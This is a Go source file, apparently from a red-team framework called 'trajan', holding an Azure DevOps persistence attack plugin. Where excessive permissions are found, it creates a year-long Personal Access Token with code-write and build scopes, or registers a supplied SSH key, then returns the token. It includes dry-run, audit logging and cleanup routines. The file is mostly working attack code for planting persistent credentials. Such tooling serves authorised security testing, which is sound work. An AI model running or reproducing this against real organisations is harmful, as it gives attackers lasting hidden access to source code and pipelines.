package persistence

import (
	"context"
	"fmt"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/azuredevops"
	"github.com/praetorian-inc/trajan/pkg/azuredevops/attacks/common"
	"github.com/praetorian-inc/trajan/pkg/detections"
)

func init() {
	registry.RegisterAttackPlugin("azuredevops", "ado-persistence", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements persistence attack via PAT or SSH key creation
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new persistence attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"ado-persistence",
			"Establish persistent access via PAT creation or SSH key injection",
			"azuredevops",
			attacks.CategoryPersistence,
		),
	}
}

// CanAttack checks if persistence attack is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	// Requires excessive permissions
	return common.FindingHasType(findings, detections.VulnExcessivePermissions)
}

// Execute performs the persistence attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	// Get ADO client
	client, err := common.GetADOClient(opts.Platform)
	if err != nil {
		result := &attacks.AttackResult{
			Plugin:    p.Name(),
			SessionID: opts.SessionID,
			Timestamp: time.Now(),
			Success:   false,
			Message:   err.Error(),
		}
		return result, err
	}

	result, err := p.executeWithClient(ctx, client, opts)
	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, err
}

// executeWithClient performs the persistence attack with an injected client (for testing)
func (p *Plugin) executeWithClient(ctx context.Context, client *azuredevops.Client, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	// Parse project/repo from target value
	project, repo, err := common.ParseProjectRepo(opts.Target.Value)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Get method from ExtraOpts, default to PAT
	method := "pat"
	if opts.ExtraOpts != nil {
		if m, ok := opts.ExtraOpts["method"]; ok {
			method = m
		}
	}

	if opts.DryRun {
		result.Success = true
		methodDisplay := "PAT"
		if method == "ssh" {
			methodDisplay = "SSH key"
		}
		result.Message = fmt.Sprintf("[DRY RUN] Would create %s for persistent access to %s/%s",
			methodDisplay, project, repo)
		return result, nil
	}

	// Execute based on method
	switch method {
	case "ssh":
		return p.createSSHKey(ctx, client, opts, result)
	default: // "pat" or empty
		return p.createPAT(ctx, client, opts, result)
	}
}

// createPAT creates a Personal Access Token for persistence
func (p *Plugin) createPAT(ctx context.Context, client *azuredevops.Client, opts attacks.AttackOptions, result *attacks.AttackResult) (*attacks.AttackResult, error) {
	displayName := fmt.Sprintf("trajan-persist-%s", opts.SessionID)

	// Create PAT with full code access
	validTo := time.Now().Add(365 * 24 * time.Hour).Format(time.RFC3339)
	req := azuredevops.CreatePATRequest{
		DisplayName: displayName,
		Scope:       "vso.code_write vso.build vso.work",
		ValidTo:     validTo,
		AllOrgs:     false,
	}

	pat, err := client.CreatePersonalAccessToken(ctx, req)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create PAT: %v", err)
		return result, err
	}

	result.Success = true
	result.Message = fmt.Sprintf("PAT created: %s (valid until %s)", displayName, validTo)
	result.Data = map[string]interface{}{
		"authorization_id": pat.AuthorizationID,
		"display_name":     pat.DisplayName,
		"token":            pat.Token,
		"scope":            pat.Scope,
	}

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        "pat",
			Identifier:  pat.AuthorizationID,
			Action:      "revoke",
			Description: "Revoke Personal Access Token",
		},
	}

	return result, nil
}

// createSSHKey creates an SSH public key for persistence
func (p *Plugin) createSSHKey(ctx context.Context, client *azuredevops.Client, opts attacks.AttackOptions, result *attacks.AttackResult) (*attacks.AttackResult, error) {
	if opts.Payload == "" {
		result.Success = false
		result.Message = "SSH public key required in Payload field"
		return result, fmt.Errorf("missing SSH public key")
	}

	displayName := fmt.Sprintf("trajan-persist-%s", opts.SessionID)

	// Create SSH key
	validTo := time.Now().Add(365 * 24 * time.Hour).Format(time.RFC3339)
	req := azuredevops.CreateSSHKeyRequest{
		DisplayName: displayName,
		PublicData:  opts.Payload,
		ValidTo:     validTo,
		IsPublic:    true,
	}

	sshKey, err := client.CreateSSHKey(ctx, req)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create SSH key: %v", err)
		return result, err
	}

	result.Success = true
	result.Message = fmt.Sprintf("SSH key created: %s (valid until %s)", displayName, validTo)
	result.Data = map[string]interface{}{
		"authorization_id": sshKey.AuthorizationID,
		"display_name":     sshKey.DisplayName,
	}

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        "ssh",
			Identifier:  sshKey.AuthorizationID,
			Action:      "delete",
			Description: "Delete SSH public key",
		},
	}

	return result, nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	// Get ADO client
	client, err := common.GetADOClient(session.Platform)
	if err != nil {
		return err
	}

	return p.cleanupWithClient(ctx, client, session)
}

// cleanupWithClient removes artifacts with an injected client (for testing)
func (p *Plugin) cleanupWithClient(ctx context.Context, client *azuredevops.Client, session *attacks.Session) error {
	// Cleanup this plugin's results
	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		for _, action := range result.CleanupActions {
			switch action.Type {
			case "pat":
				// Revoke PAT by authorizationID
				if err := client.RevokePersonalAccessToken(ctx, action.Identifier); err != nil {
					return fmt.Errorf("revoking PAT %s: %w", action.Identifier, err)
				}
			case "ssh":
				// Delete SSH key by authorizationID
				if err := client.DeleteSSHKey(ctx, action.Identifier); err != nil {
					return fmt.Errorf("deleting SSH key %s: %w", action.Identifier, err)
				}
			}
		}
	}

	return nil
}
